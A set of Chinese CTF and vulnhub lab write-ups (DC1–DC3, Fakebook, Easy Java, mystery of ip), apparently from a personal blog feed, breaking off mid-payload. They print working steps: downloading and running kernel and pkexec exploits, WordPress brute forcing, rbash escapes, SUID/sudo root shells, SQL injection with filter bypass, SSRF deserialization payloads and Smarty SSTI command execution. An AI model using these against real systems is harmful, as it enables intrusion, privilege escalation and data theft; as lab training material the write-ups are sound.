href="https://juejin.cn/post/7164665837511507999">LINUX提权之内核漏洞提权篇</a></p><p>先进行内核的查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411091229892.png" alt="image-20230411091229892"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a      # 查看发行版本</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411091330803.png" alt="image-20230411091330803"></p><p><code> </code></p><p>于是就使用searchsploit</p><p><img src="../images/image-20230411091513906.png" alt="image-20230411091513906"></p><p>这两个玩意确实存在漏洞</p><h4 id="cve-2016-4557"><a href="#cve-2016-4557" class="headerlink" title="cve-2016-4557"></a>cve-2016-4557</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchspolit -x linux/local/39772.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411094349657.png" alt="image-20230411092545805"></p><p>还会把CVE告诉你</p><p>于是访问这个本地的这个完整地址</p><p><img src="../images/image-20230411092823114.png" alt="image-20230411092823114"></p><p>发现给了一个exp下载地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//将exp下载过来</span><br><span class="line">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</span><br><span class="line"> </span><br><span class="line">//解压</span><br><span class="line">unzip 39772.zip</span><br><span class="line"> </span><br><span class="line">//进去到39772目录</span><br><span class="line">cd 39*</span><br><span class="line"> </span><br><span class="line">//解压exploit.tar</span><br><span class="line">tar -xvf ex*</span><br><span class="line"> </span><br><span class="line">//到ebpf_mapfd_doubleput_exploit目录中</span><br><span class="line">cd eb*</span><br><span class="line"> </span><br><span class="line">//运行compile.sh文件</span><br><span class="line">./compile.sh</span><br><span class="line"> </span><br><span class="line">//运行生成的文件doubleput</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411093124013.png" alt="image-20230411093124013"></p><p><strong>这就是利用内核提权</strong></p><p><img src="../images/image-20230411093211569.png" alt="image-20230411093211569"></p><h4 id="cve-2021-4034"><a href="#cve-2021-4034" class="headerlink" title="cve-2021-4034"></a>cve-2021-4034</h4><p><a href="https://www.iceswordlab.com/2022/02/10/CVE-2021-4034/">CVE-2021-4034 pkexec 本地提权漏洞利用解析</a>   这篇文章也可以进行利用</p><p><img src="../images/image-20230411093533747.png" alt="image-20230411093533747"></p><p>测试环境，比上面的环境还要新</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//使用git命令将exp复制到靶机中</span><br><span class="line">git clone https://github.com/arthepsy/CVE-2021-4034</span><br><span class="line"> </span><br><span class="line">//来到CVE-2021-4034目录</span><br><span class="line">cd CVE*</span><br><span class="line"> </span><br><span class="line">//编译cve-2021-4034-poc.c</span><br><span class="line">gcc cve* -o cve-2021-4034</span><br><span class="line"> </span><br><span class="line">//运行cve-2021-4034</span><br><span class="line">./cve-2021-4034</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><strong>总结</strong></p><p>学到了几个工具的使用</p><p><strong>joomscan —-&gt;  针对joom的cms的</strong></p><p><strong>searchspolit  ——-&gt;    查找exp的  例如cms  内核版本</strong>   </p><p><strong>john  ———&gt;    爆破加密密码</strong></p><p><strong>sqlmap   就是经常用的工具了</strong>  </p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub DC3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub DC2</title>
      <link href="/posts/d620da00.html"/>
      <url>/posts/d620da00.html</url>
      
        <content type="html"><![CDATA[<p><strong>总结:cewl和wpscan的使用，rbash逃逸，suid<a href="https://so.csdn.net/so/search?q=提权&amp;spm=1001.2101.3001.7020">提权</a></strong></p><p>cewl  ——&gt;   密码生成工具</p><p>wpscan  —-&gt;  爆破用户名</p><p><a href="https://www.freebuf.com/sectool/174663.html">WPScan使用完整攻略：如何对Wordpress站点进行安全测试</a></p><p><img src="../images/image-20230409204637751.png" alt="image-20230409204637751"></p><p>还是现扫下c段看下靶机ip</p><p><img src="../images/image-20230409203330539.png" alt="image-20230409203330539"></p><p>猜一下是131，或者用和DC1说的那种关靶机的方法也行</p><p><img src="../images/image-20230409203510524.png" alt="image-20230409203510524"></p><p>靶机开了两个端口</p><p><img src="../images/image-20230409203649238.png" alt="image-20230409203649238"></p><p>发现重定向到一个域名，这里和htb里的一道题一样，得修改hosts</p><p><strong>就是dns域名解析有关</strong></p><p><img src="../images/image-20230409203850335.png" alt="image-20230409203850335"></p><p>修改好后再次进行访问</p><p><img src="../images/image-20230409203912792.png" alt="image-20230409203912792"></p><p>成功进行访问</p><p><img src="../images/image-20230409203935440.png" alt="image-20230409203935440"></p><p>这次是使用了wordpress框架</p><p><img src="../images/image-20230409204105356.png" alt="image-20230409204105356"></p><p>找到了flag1</p><p>并且给了提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">您通常的单词列表可能不起作用，所以相反，也许您只需要 cewl。</span><br><span class="line"></span><br><span class="line">更多密码总是更好，但有时您无法赢得所有密码。</span><br><span class="line"></span><br><span class="line">以一个人身份登录以查看下一个标志。</span><br><span class="line"></span><br><span class="line">如果找不到，请以另一个身份登录。</span><br></pre></td></tr></table></figure><p>这里就提示了使用<strong>cewl</strong>(一个字典生成工具)</p><p><a href="https://www.codercto.com/a/44828.html">cewl的详细使用教学</a></p><p>通过他的提示，也该不止有一个用户</p><p>所以我们就得使用工具爆破出这个网站的所有用户</p><p>那么既然我们有了密码 我们还需要知道用户名使用<strong>wpscan</strong> 这个工具  针对wordpress框架使用的</p><p>使用命令：<code>wpscan --url http://dc-2/ -e</code></p><p><img src="../images/image-20230409205001726.png" alt="image-20230409205001726"></p><p>扫到了三个用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2 -w pass.txt 然后就去参考别的人的了</span><br><span class="line">wpscan --url http://dc-2/ -e //枚举用户名</span><br><span class="line">echo &quot;admin\njerry\ntom\n&quot; &gt; user.txt //将枚举到的三个用户，添加到user.txt中</span><br><span class="line">wpscan --url http://dc-2 user.txt -P pass.txt //然后爆破账号密码</span><br></pre></td></tr></table></figure><p>爆破出来密码了   接下来就是登录后台了</p><p><img src="../images/image-20230409210248545.png" alt="image-20230409210248545"></p><p>admin没爆破出来</p><p>所以我们开始扫网站的目录</p><p><img src="../images/image-20230409210736812.png" alt="image-20230409210736812"></p><p>用其他扫目录工具也行，扫出来一个后台</p><p><img src="../images/image-20230409210819324.png" alt="image-20230409210819324"></p><p>重定向到了一个登录框，那么我们就拿之前爆破出来的账号密码进行登录</p><p><img src="../images/image-20230409210935313.png" alt="image-20230409210935313"></p><p>成功登录后台</p><p><img src="../images/image-20230409211115820.png" alt="image-20230409211115820"></p><p>找到了flag2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果您不能利用 WordPress 并走捷径，还有另一种方法。</span><br><span class="line">（就是不能利用exp）</span><br><span class="line">希望你找到了另一个切入点。</span><br></pre></td></tr></table></figure><p>也尝试<code>tom</code>账户 发现并没有什么可用的信息，那么我们之前扫出来的开启ssh端口就派上用场了</p><p><img src="../images/image-20230409211423049.png" alt="image-20230409211423049"></p><p>真的登录成功了</p><p><img src="../images/image-20230409211507283.png" alt="image-20230409211507283"></p><p>但是出现了一个特殊情况就是命令没有被找到</p><p>爆了一个   <strong>-rbash的玩意</strong></p><p><a href="https://cloud.tencent.com/developer/article/1680551">rbash绕过</a></p><p>那么我们尝试进行编辑查看，看行不行(就是使用vim)</p><p><img src="../images/image-20230409211629232.png" alt="image-20230409211629232"></p><p>发现可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可怜的老汤姆总是追着杰瑞。也许他应该为他造成的所有压力而苏。</span><br></pre></td></tr></table></figure><p>根据这个内容切换成jerry账户一下</p><p>所以猜想这里的提示应该是想我们切换到jerry用户，而不是重新ssh登录到jerry用户</p><p>然后发现密码不对，所以就还是好好研究一下怎么绕过<strong>rbash</strong>吧</p><p><strong>tips</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//方法1</span><br><span class="line">vi a //随便一个文件</span><br><span class="line">shift+;  输入set shell=/bin/bash回车</span><br><span class="line">shift+;  输入shell</span><br><span class="line">输入export PATH=$PATH:/bin/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//方法2</span><br><span class="line">BASH_CMDS[A]=/bin/sh;A //进入sh环境</span><br><span class="line">/bin/bash  //来到bash环境</span><br><span class="line">export PATH=$PATH:/bin/</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409213553364.png" alt="image-20230409213553364"></p><p>成功绕过</p><p><strong>然后我们su jerry ，来到jerry用户，cd来到默认目录就可以看到flag4.txt</strong></p><p><img src="../images/image-20230409213728621.png" alt="image-20230409213728621"></p><p>看到flag4.txt的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">很高兴看到你已经走到这一步 - 但你还没有到家。</span><br><span class="line"></span><br><span class="line">您仍然需要获得最终标志（唯一真正重要的标志！！！）。</span><br><span class="line"></span><br><span class="line">这里没有提示 - 你现在靠自己了。 :-)</span><br><span class="line"></span><br><span class="line">继续 - 离开这里！！！！</span><br></pre></td></tr></table></figure><p>猜测就是提权了</p><p>因为这里并不是root用户</p><p>还是用find命令尝试一下(suid)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409214009428.png" alt="image-20230409214009428"></p><p>有个sudo可以用  那么就猜测这里是用sudo提权</p><p>那么就、<code>sudo -l</code>一下,看谁有root权限</p><p><img src="../images/image-20230409214118195.png" alt="image-20230409214118195"></p><p>发现是git，还没有密码限制</p><p><img src="../images/image-20230409214149805.png" alt="image-20230409214149805"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line"></span><br><span class="line">然后直接输入!/bin/bash</span><br><span class="line"></span><br><span class="line">然后我们就是root了，在然后就是获得flag了</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409214323234.png" alt="image-20230409214323234"></p><p>然后就是root用户了</p><p>接下来直接读取flag就行了</p><p><img src="../images/image-20230409214511930.png" alt="image-20230409214511930"><strong>wpscan这个工具感觉是为了wordpress而准备的</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub DC2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC1</title>
      <link href="/posts/bd435367.html"/>
      <url>/posts/bd435367.html</url>
      
        <content type="html"><![CDATA[<p>先扫一下c段，看一下哪个才是靶机</p><p><img src="../images/image-20230409181402738.png" alt="image-20230409181402738"></p><p>然后就随便猜一个，（或者关掉靶机，在重新扫一遍看哪个没了哪个就是靶机）</p><p>这里的话128是靶机</p><p>接下来就是扫端口了</p><p><img src="../images/image-20230409181552407.png" alt="image-20230409181552407"></p><p>扫到了三个端口</p><p>80端口一看就是个网站，那么我们尝试一下看能不能直接无密码(或者弱密码)登录ssh</p><p><img src="../images/image-20230409181755763.png" alt="image-20230409181755763"></p><p>尝试失败，那么我们就尝试一下去查看一下80端口</p><p><img src="../images/image-20230409181842624.png" alt="image-20230409181842624"></p><p>发现是一个cms框架，版本是7.x，那么我们就可以去查看一下有没有这个框架的exp能直接来打</p><p><strong>在msf中搜索一下</strong></p><p><img src="../images/image-20230409182322318.png" alt="image-20230409182322318"></p><p>发现有这个框架的exp  和aux(这个是判断是否存在漏洞)</p><p>那我们就直接使用直接使用这个exp来打这个网站了，用的是第二个</p><p><img src="../images/image-20230409183330747.png" alt="image-20230409183330747"></p><p>设置靶机地址</p><p><strong>set rhosts xxxxxxxxxx</strong></p><p><img src="../images/image-20230409183407891.png" alt="image-20230409183407891"></p><p>设置成功   (后面是yes的，前面的内容必须得写上)</p><p><img src="../images/image-20230409183548884.png" alt="image-20230409183548884"></p><p>反弹shell成功  拿到了<strong>meterpreter</strong></p><p><img src="../images/image-20230409183643295.png" alt="image-20230409183643295"></p><p>读取flag1的时候给了一段话     就是config配置文件</p><p><img src="../images/image-20230409183738020.png" alt="image-20230409183738020"></p><p>访问配置文件拿到关键数据</p><p><img src="../images/image-20230409183955691.png" alt="image-20230409183955691"></p><p><img src="../images/image-20230409183912269.png" alt="image-20230409183912269"></p><p>这里数据库登录报错，就不登陆了，直接进行提权拿最终的flag就行</p><p><img src="../images/image-20230409190252841.png" alt="image-20230409190252841"></p><p>这里的话先尝试一下suid   这里话在htb里面做过，这里就不多说了</p><p>这里如果按顺序拿flag的话会提示用suid</p><p>这里话弄个交互shell好进行查询</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>\;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409190621996.png" alt="image-20230409190621996"></p><p><img src="../images/image-20230409190655243.png" alt="image-20230409190655243"></p><p>提权的话可以直接拿到最终的flag</p><p>于是就是进行suid提权</p><p>先查找一下谁具有s权限</p><p><img src="../images/image-20230409190830425.png" alt="image-20230409190830425"></p><p>找到了个find命令可以使用</p><p>于是进行find提权</p><p><img src="../images/image-20230409191336590.png" alt="image-20230409191336590"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find ./ -exec &quot;/bin/sh&quot; \;</span><br><span class="line">find  在哪执行 -exec &quot;代码执行&quot; \</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub DC1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-刷题记录 第二页</title>
      <link href="/posts/6446e84f.html"/>
      <url>/posts/6446e84f.html</url>
      
        <content type="html"><![CDATA[<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>题目</p><p><img src="../images/image-20230406145253672.png" alt="image-20230406145253672"></p><p>访问robots.txt得到下面内容</p><p><img src="../images/image-20230406145322985.png" alt="image-20230406145322985"></p><p>访问下载下来得到一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406145503826.png" alt="image-20230406145503826"></p><p>这里存在一个ssrf</p><p>就是curl_exec使用不当会导致ssrf，然后我们回到首页，注册一个账号，然后点进去后，发现有一个类似sql注入的东西</p><p><img src="../images/image-20230406145655942.png" alt="image-20230406145655942"></p><p>然后就怀疑这里会不会存在sql注入</p><p>于是尝试手工注入：</p><p>?no = 1 and 1=1　　//回显正常</p><p>?no = 1 and 1=2　　//错误回显</p><p>铁定数字型注入，于是我们看看表中有多少列，确定一下列数，</p><p>?no = 1 order by 3　　　　//正常</p><p>?no = 1 order by 4　　　　//正常</p><p>?no = 1 order by 5　　　　//错误</p><p>所以确定列数，有4列</p><p>于是我们尝试union联合注入：</p><p>?no = -1 union select 1,2,3,4—+</p><p><a href="https://img2020.cnblogs.com/blog/2075370/202012/2075370-20201208171409279-1904431169.png"><img src="https://img2020.cnblogs.com/blog/2075370/202012/2075370-20201208171409279-1904431169.png" alt="img"></a></p><p> 结果有这么一段话，被发现了。</p><p>然后，通过大佬wp中发现，过滤了union select     (这里过滤的不是单个，而是整个进行了过滤)所以可以用下面的方式进行绕过</p><p>可以用过union/**/select绕过</p><p>于是我们再次构造payload:</p><p>?no = -1 union/**/select 1,2,3,4—+</p><p><img src="../images/image-20230406150007353.png" alt="image-20230406150007353"></p><p> 回显位是username,然后还发现了一下错误信息，/var/www/html/view.php刚才扫目录得知flag.php也在这个目录中。</p><p>然后我们开始查数据库和数据库信息</p><p>?no=-1 union/**/select 1,database(),3,4—+　　//数据库名</p><p><img src="../images/image-20230406150253089.png" alt="image-20230406150253089"></p><p>?no=-1 union/**/select 1,user(),3,4—+　　　　//数据库信息</p><p><img src="../images/image-20230406150330888.png" alt="image-20230406150330888"></p><p>是root用户</p><p>发现居然是root权限，那我们知道有一个load_file()函数可以利用绝对路径去加载一个文件，于是我们利用一下</p><p>load_file(file_name):file_name是一个完整的路径，于是我们直接用var/www/html/flag.php路径去访问一下这个文件</p><p>?no=-1 union/**/select 1,load_file(“/var/www/html/flag.php”),3,4—+</p><p><img src="../images/image-20230406150538443.png" alt="image-20230406150538443"></p><p>这是非预期解</p><p>接下来是预期解</p><p>爆数据库表</p><p>?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()—+</p><p><img src="../images/image-20230406150702385.png" alt="image-20230406150702385"></p><p> 获得一张users表</p><p>然后爆字段名：</p><p>?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=’users’—+</p><p><img src="../images/image-20230406150734818.png" alt="image-20230406150734818"></p><p> 这里面no，username,password我们都知道是什么，就data有点猫腻，于是我们查看它一下，于是我们爆data内容：</p><p>?no=-1 union/<strong>/select/</strong>/1,group_concat(no,’~’,username,’~’,passwd,’~’,data),3,4/<strong>/from/</strong>/fakebook.users</p><p><img src="../images/image-20230406150941192.png" alt="image-20230406150941192"></p><p>是一个序列化后的值，然后结合我们上面获得到的源码来进行分析</p><p>就是可以控制博客的值来进行ssrf</p><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$res</span> = <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;UserInfo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">1</span>;s:<span class="number">4</span>:<span class="string">&quot;blog&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>根据之前的注入可知，有回显的是第二位，也就是<code>username</code>字段，<code>data</code>对应应该就是第四个字段为，将反序列化字符串尝试以注入的方式写入</p><p><img src="../images/image-20230406151427472.png" alt="image-20230406151427472"></p><p>对下面的东西进行base64编码就行了</p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p><a href="https://blog.csdn.net/qq_42812036/article/details/104280196">这篇文章讲了源码泄露的例子</a></p><p>题目</p><p><img src="../images/image-20230406151807004.png" alt="image-20230406151807004"></p><p>登录框是弱密码</p><p><strong>admin/admin888</strong></p><p><img src="../images/image-20230406152326149.png" alt="image-20230406152326149"></p><p>发现没啥东西，然后点击下面的help的话，就会出现这个东西</p><p><img src="../images/image-20230406152427782.png" alt="image-20230406152427782"></p><p>并且它的url也很有意思，貌似可以下载文件</p><p>发现get不行</p><p>试试post</p><p><img src="../images/image-20230406152628037.png" alt="image-20230406152628037"></p><p>可进行文件的下载</p><p><img src="../images/image-20230406152653573.png" alt="image-20230406152653573"></p><p>打开后啥也没有，尝试去看看会不会存在源码泄露</p><p><img src="../images/image-20230406152737617.png" alt="image-20230406152737617"></p><p>存在源码泄露</p><p><img src="../images/image-20230406152823449.png" alt="image-20230406152823449"></p><p>这像是文件存放的路径</p><p>读取<code>FlagController.class</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure><p>这个路径的话写过java的就能懂了</p><p><img src="../images/image-20230406153211962.png" alt="image-20230406153211962"></p><p>下载文件后就可以拿到flag了</p><p><img src="../images/image-20230406153311897.png" alt="image-20230406153311897"></p><p>把文件内的编码进行base64解码就行了</p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>题目</p><p><img src="../images/image-20230406153757995.png" alt="image-20230406153757995"></p><p>打开界面，转到flag下面，发现展示我IP的一个界面，看到这个就突然想到了 X-Forwarded-For  </p><p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。说白了就是检测外来接入的IP地址的东西，之前做题目的时候经常会遇到限制只能用默写特定的ip访问的题目，抓包之后改他就对了。</p><p>进入环境，发现还是那个熟悉的页面，hint里给我们提示了ip，在flag.php那里尝试xff头，发现成功回显，说明回显的点在xff头那里。猜测是SSTI。</p><p><img src="../images/image-20230406155110102.png" alt="image-20230406155110102"></p><p>确实是成功修改了</p><p><img src="../images/image-20230406155146646.png" alt="image-20230406155146646"></p><p>返回了49，说明不是jinja2的ssti</p><p><img src="../images/image-20230406155308230.png" alt="image-20230406155308230"></p><p>所以就通过判断来确定是上面的哪种类型</p><p><img src="../images/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBATDFhbTB1cg==,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p><p>就是通过这张图来判断ssti的类型</p><p><img src="../images/image-20230406192122449.png" alt="image-20230406192122449"></p><p>由此来判断是smarty的ssti模板注入</p><p><a href="https://www.freebuf.com/column/219913.html">smarty  ssti</a></p><p>知道了之后就直接写payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">&#123;<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat 